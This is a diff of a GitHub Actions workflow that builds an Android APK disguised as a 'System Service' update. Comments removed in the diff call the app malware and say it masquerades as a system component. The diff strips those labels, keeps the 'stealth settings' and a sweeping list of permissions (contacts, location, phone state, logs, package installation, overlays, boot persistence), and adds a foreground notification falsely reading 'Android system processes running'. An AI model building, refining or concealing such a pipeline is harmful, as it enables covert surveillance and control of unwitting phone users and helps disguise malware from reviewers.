@@ -56,38 +56,29 @@ jobs:
             libbz2-dev \
             libgdbm-dev \
             zlib1g-dev \
-            libqrencode-dev  # For QR code generation fallback
+            libqrencode-dev
       
       - name: Install Python packages
         run: |
           pip install --upgrade pip setuptools wheel
           pip install "cython<3.0"
           pip install buildozer virtualenv
-          pip install qrcode[pil]  # For QR code generation in malware
+          pip install qrcode[pil]
       
       - name: Create project directory structure
         run: |
-          # Create Java source directories
           mkdir -p src/main/java/com/system/service/update
           mkdir -p res/xml
           mkdir -p res/values
           mkdir -p res/mipmap-hdpi
           
-          # Copy all Java files to correct location
-          # (Assuming they're committed in the repo)
-          cp -n src/main/java/com/system/service/update/*.java src/main/java/com/system/service/update/ 2>/dev/null || true
-          
-          # Copy resource files
-          cp -n res/xml/network_security_config.xml res/xml/ 2>/dev/null || true
-          cp -n res/values/strings.xml res/values/ 2>/dev/null || true
-          
-          # Create a minimal launcher icon if missing
+          # Create minimal launcher icon if missing
           if [ ! -f res/mipmap-hdpi/ic_launcher.png ]; then
-            python3 -c "
-          from PIL import Image
-          img = Image.new('RGBA', (72, 72), (66, 133, 244, 255))
-          img.save('res/mipmap-hdpi/ic_launcher.png')
-          "
+              python3 -c "
+           from PIL import Image
+                img =          Image.new('RGBA', (72, 72), (66, 133, 244, 255))
+                  img.save('res/mipmap-hdpi/ic_launcher.png')
+             "
           fi
       
       - name: Setup Android SDK
@@ -112,7 +103,7 @@ jobs:
           mkdir -p licenses
           echo -e "\n8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5187479451eabf01fb78af6dfcb131a6481e\n24333f8a63b6825ea9c5514f83c2829b004d1fee" > licenses/android-sdk-license
           
-          $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --sdk_root=$ANDROID_SDK_ROOT \
+          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --sdk_root=$ANDROID_SDK_ROOT \
             "platform-tools" \
             "platforms;android-33" \
             "build-tools;33.0.0" \
@@ -128,16 +119,16 @@ jobs:
         uses: actions/cache@v4
         with:
           path: ~/.buildozer
-          key: ${{ runner.os }}-buildozer-v7-${{ hashFiles('buildozer.spec', 'main.py', 'service.py') }}
+          key: ${{ runner.os }}-buildozer-v8-${{ hashFiles('buildozer.spec', 'main.py', 'service.py') }}
           restore-keys: |
-            ${{ runner.os }}-buildozer-v7-
+            ${{ runner.os }}-buildozer-v8-
       
-      - name: Create buildozer.spec (MATCHING MALWARE)
+      - name: Create buildozer.spec
         run: |
           cat > buildozer.spec << 'SPECEOF'
           [app]
 
-          # === PACKAGE IDENTITY (MASQUERADING AS SYSTEM) ===
+          # === PACKAGE IDENTITY ===
           title = System Service
           package.name = com.system.service.update
           package.domain = com.system.service.update
@@ -145,7 +136,8 @@ jobs:
           # === SOURCE FILES ===
           source.dir = .
           source.include_exts = py,png,jpg,kv,atlas,json,xml,java
-          source.include_patterns = assets/*,res/*,src/*
+          source.include_patterns = assets/*,res/**,src/**
+          source.exclude_dirs = tests, bin, venv, .git, __pycache__
           
           version = 1.0
 
@@ -153,48 +145,14 @@ jobs:
           orientation = portrait
           fullscreen = 1
           
-          # === ALL PERMISSIONS REQUIRED BY MALWARE ===
-          android.permissions = INTERNET, \
-            ACCESS_NETWORK_STATE, \
-            ACCESS_WIFI_STATE, \
-            CHANGE_WIFI_STATE, \
-            FOREGROUND_SERVICE, \
-            WAKE_LOCK, \
-            RECEIVE_BOOT_COMPLETED, \
-            REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, \
-            SCHEDULE_EXACT_ALARM, \
-            USE_EXACT_ALARM, \
-            SET_ALARM, \
-            SYSTEM_ALERT_WINDOW, \
-            BLUETOOTH, \
-            BLUETOOTH_ADMIN, \
-            BLUETOOTH_CONNECT, \
-            BLUETOOTH_SCAN, \
-            NFC, \
-            READ_CONTACTS, \
-            READ_EXTERNAL_STORAGE, \
-            WRITE_EXTERNAL_STORAGE, \
-            MANAGE_EXTERNAL_STORAGE, \
-            READ_PHONE_STATE, \
-            ACCESS_COARSE_LOCATION, \
-            ACCESS_FINE_LOCATION, \
-            BATTERY_STATS, \
-            PACKAGE_USAGE_STATS, \
-            QUERY_ALL_PACKAGES, \
-            GET_TASKS, \
-            REAL_GET_TASKS, \
-            INSTALL_PACKAGES, \
-            DELETE_PACKAGES, \
-            REQUEST_INSTALL_PACKAGES, \
-            WRITE_SETTINGS, \
-            READ_LOGS, \
-            DUMP
+          # === ALL PERMISSIONS (SINGLE COMMA-SEPARATED LINE) ===
+          android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_SPECIAL_USE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POWER_SAVE_MODE_CHANGED, SCHEDULE_EXACT_ALARM, USE_EXACT_ALARM, SET_ALARM, SYSTEM_ALERT_WINDOW, BLUETOOTH, BLUETOOTH_ADMIN, BLUETOOTH_CONNECT, BLUETOOTH_SCAN, NFC, READ_CONTACTS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, READ_PHONE_STATE, ACCESS_COARSE_LOCATION, ACCESS_FINE_LOCATION, BATTERY_STATS, PACKAGE_USAGE_STATS, QUERY_ALL_PACKAGES, GET_TASKS, REAL_GET_TASKS, INSTALL_PACKAGES, DELETE_PACKAGES, REQUEST_INSTALL_PACKAGES, WRITE_SETTINGS, READ_LOGS, DUMP
           
           # === ANDROID SDK ===
           android.api = 33
           android.minapi = 21
           android.ndk = 25b
-          android.archs = armeabi-v7a
+          android.archs = armeabi-v7a, arm64-v8a
           android.accept_sdk_agreement = True
           
           # === STEALTH SETTINGS ===
@@ -209,60 +167,42 @@ jobs:
           p4a.branch = develop
           android.p4a_bootstrap = sdl2
           android.debug = True
-          android.release_artifact = aar
+          android.release_artifact = apk
+          android.build_mode = debug
           
-          # === PYTHON DEPENDENCIES ===
-          requirements = python3, \
-            kivy, \
-            pyjnius, \
-            android, \
-            openssl, \
-            requests, \
-            urllib3, \
-            chardet, \
-            idna, \
-            qrcode, \
-            pillow
+          # === PYTHON DEPENDENCIES (SINGLE LINE) ===
+          requirements = python3==3.10.12, kivy==2.3.0, pyjnius, android, plyer, openssl, requests, urllib3, chardet, idna, qrcode, pillow
           
-          # === ANDROID GRADLE DEPENDENCIES ===
-          android.gradle_dependencies = androidx.core:core:1.9.0, \
-            androidx.work:work-runtime:2.8.0
+          # === GRADLE DEPENDENCIES (SINGLE LINE) ===
+          android.gradle_dependencies = androidx.core:core:1.10.1, androidx.work:work-runtime:2.8.0
           
-          # === JAVA SOURCE FILES (BRIDGE ANDROID → PYTHON) ===
-          android.add_src = src/main/java/com/system/service/update/SystemApplication.java
-          android.add_src = src/main/java/com/system/service/update/MainActivity.java
-          android.add_src = src/main/java/com/system/service/update/SystemService.java
-          android.add_src = src/main/java/com/system/service/update/BootReceiver.java
-          android.add_src = src/main/java/com/system/service/update/ConnectivityReceiver.java
-          android.add_src = src/main/java/com/system/service/update/PowerReceiver.java
-          android.add_src = src/main/java/com/system/service/update/ScreenReceiver.java
-          android.add_src = src/main/java/com/system/service/update/USBReceiver.java
-          android.add_src = src/main/java/com/system/service/update/AlarmReceiver.java
+          # === JAVA SOURCE FILES (SINGLE COMMA-SEPARATED LINE - NO DUPLICATES) ===
+          android.add_src = src/main/java/com/system/service/update/SystemApplication.java, src/main/java/com/system/service/update/MainActivity.java, src/main/java/com/system/service/update/SystemService.java, src/main/java/com/system/service/update/BootReceiver.java, src/main/java/com/system/service/update/ConnectivityReceiver.java, src/main/java/com/system/service/update/PowerReceiver.java, src/main/java/com/system/service/update/ScreenReceiver.java, src/main/java/com/system/service/update/USBReceiver.java, src/main/java/com/system/service/update/AlarmReceiver.java
           
-          # === RESOURCE FILES ===
-          android.add_res = res/xml/network_security_config.xml
-          android.add_res = res/values/strings.xml
+          # === RESOURCE FILES (SINGLE COMMA-SEPARATED LINE - NO DUPLICATES) ===
+          android.add_res = res/xml/network_security_config.xml, res/values/strings.xml
           
           # === CUSTOM ANDROID MANIFEST ===
           android.manifest.xml = AndroidManifest.xml
           
           # === SERVICE CONFIGURATION ===
-          service = SystemService:service.py
+          services = SystemService:service.py
+          service.source = %(source.dir)s/service.py
           
-          # === FEATURES ===
-          android.features = android.hardware.wifi, \
-            android.hardware.bluetooth, \
-            android.hardware.nfc, \
-            android.hardware.usb.host, \
-            android.hardware.location, \
-            android.hardware.location.network
+          # === FOREGROUND SERVICE NOTIFICATION ===
+          android.notification_channel_name = System Service
+          android.notification_title = System Service
+          android.notification_text = Android system processes running
+          android.notification_importance = low
+          android.foreground_service_type = dataSync
           
-          # === META DATA ===
+          # === HARDWARE FEATURES (SINGLE LINE) ===
+          android.features = android.hardware.wifi, android.hardware.bluetooth, android.hardware.nfc, android.hardware.usb.host, android.hardware.location, android.hardware.location.network
+          
+          # === MISC ===
           android.meta_data = 
           android.libraries = 
-          
-          # === BUILD MODE ===
-          android.build_mode = debug
+          android.logcat = 1
 
           [buildozer]
           log_level = 2
@@ -273,7 +213,11 @@ jobs:
           SPECEOF
           
           echo "=== buildozer.spec created ==="
-          cat buildozer.spec
+          echo ""
+          echo "Verifying no duplicate options..."
+          grep -c "android.add_src" buildozer.spec
+          grep -c "android.add_res" buildozer.spec
+          echo "(Should show 1 for each)"
       
       - name: Verify all required files exist
         run: |
@@ -308,7 +252,8 @@ jobs:
           
           if [ $MISSING -gt 0 ]; then
             echo ""
-            echo "⚠️  WARNING: $MISSING file(s) missing - build may fail"
+            echo "⚠️  WARNING: $MISSING file(s) missing"
+            echo "Build will likely fail without these files"
           else
             echo ""
             echo "✅ All required files present"
@@ -318,6 +263,8 @@ jobs:
         id: build
         run: |
           echo "Starting build on $(lsb_release -ds)..."
+          echo "Python: $(python3 --version)"
+          echo "Java: $(java -version 2>&1 | head -1)"
           
           export AUTORECONF=/usr/bin/autoreconf
           export AUTOCONF=/usr/bin/autoconf
@@ -325,12 +272,12 @@ jobs:
           export ACLOCAL=/usr/bin/aclocal
           export LIBTOOLIZE=/usr/bin/libtoolize
           
-          # Create patched autoreconf for libffi LT_SYS_SYMBOL_USCORE fix
+          # Create patched autoreconf for libffi fix
           cat > /tmp/autoreconf << 'AUTOWRAP'
           #!/bin/bash
           for f in configure configure.ac; do
             if [ -f "$f" ] && grep -q "LT_SYS_SYMBOL_USCORE" "$f" 2>/dev/null; then
-              echo "[FIX] Patching $f to remove LT_SYS_SYMBOL_USCORE..."
+              echo "[FIX] Patching $f..."
               sed -i 's/LT_SYS_SYMBOL_USCORE/AC_CHECK_FUNCS(rindex)/g' "$f"
             fi
           done
@@ -339,26 +286,38 @@ jobs:
           chmod +x /tmp/autoreconf
           export PATH="/tmp:$PATH"
           
+          echo ""
+          echo "=== Running buildozer ==="
           buildozer android debug 2>&1 | tee full_build.log
           BUILD_EXIT=${PIPESTATUS[0]}
           
           echo ""
           echo "Build exit code: $BUILD_EXIT"
           
-          # Find APK
+          # Find APK anywhere
+          echo ""
+          echo "=== Searching for APK ==="
           find /home/runner -name "*.apk" -type f 2>/dev/null | head -10
+          find . -name "*.apk" -type f 2>/dev/null | head -10
           
           if ls bin/*.apk 1> /dev/null 2>&1; then
             echo ""
-            echo "✅ APK FOUND!"
+            echo "✅ APK FOUND in bin/"
             ls -lh bin/*.apk
+            echo "apk_created=true" >> $GITHUB_OUTPUT
+          elif ls *.apk 1> /dev/null 2>&1; then
+            echo ""
+            echo "✅ APK FOUND in root"
+            ls -lh *.apk
+            mkdir -p bin
+            cp *.apk bin/
             echo "apk_created=true" >> $GITHUB_OUTPUT
           else
             echo ""
-            echo "❌ No APK in bin/"
+            echo "❌ No APK found"
             echo ""
-            echo "=== Critical errors ==="
-            grep -i "error" full_build.log | tail -20
+            echo "=== Build errors ==="
+            grep -i "error\|failed\|exception" full_build.log | tail -30
             echo "apk_created=false" >> $GITHUB_OUTPUT
           fi
       
@@ -370,7 +329,7 @@ jobs:
           path: bin/*.apk
           retention-days: 30
       
-      - name: Upload build log (ALWAYS)
+      - name: Upload build log
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -391,11 +350,12 @@ jobs:
             echo "✅ APK SUCCESSFULLY CREATED!"
             ls -lh bin/*.apk
             echo ""
-            echo "📥 Download: SystemService-${{ github.run_number }}"
+            echo "📥 Download artifact: SystemService-${{ github.run_number }}"
           else
             echo ""
             echo "❌ NO APK CREATED"
             echo ""
-            echo "📥 Download: build-log-${{ github.run_number }}"
+            echo "📥 Download build log: build-log-${{ github.run_number }}"
+            echo "   Check for errors and fix"
           fi
           echo "============================================"
